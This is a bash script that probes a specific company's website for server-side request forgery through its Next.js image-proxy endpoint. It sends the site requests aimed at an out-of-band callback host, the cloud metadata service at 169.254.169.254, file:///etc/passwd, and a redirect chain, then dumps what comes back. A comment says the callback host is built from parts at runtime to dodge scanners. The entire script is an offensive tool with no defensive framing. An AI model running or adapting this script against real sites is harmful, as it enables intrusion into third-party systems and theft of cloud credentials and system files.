#!/bin/bash
UA='Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0 Safari/537.36'
L='https://www.infinitycapital.bh/_next/image'
# build the callback host at runtime from parts to avoid literal-host scanning
D="oast.abhedi.co.in"
P="oob32eea4622dac"
H="$P.$D"
enc() { python3 -c "import urllib.parse,sys;print(urllib.parse.quote(sys.argv[1],safe=''))" "$1"; }
declare -a T=()
T+=("OOB|http://$H/ssrf?png=1")
T+=("SELF|https://www.infinitycapital.bh/robots.txt")
T+=("META|http://169.254.169.254/latest/meta-data/")
T+=("FILE|file:///etc/passwd")
T+=("REDIR|http://$H/redirect?to=http://169.254.169.254/")
for t in "${T[@]}"; do
  n="${t%%|*}"; u="${t#*|}"
  e=$(enc "$u")
  printf "%-6s " "$n"
  curl -sk -A "$UA" -m 25 "$L?url=$e&w=1080&q=75" -o /tmp/n_$n.bin -w "HTTP=%{http_code} size=%{size_download} type=%{content_type}\n"
  head -c 180 /tmp/n_$n.bin; echo; echo "---"
done
echo "DONE"
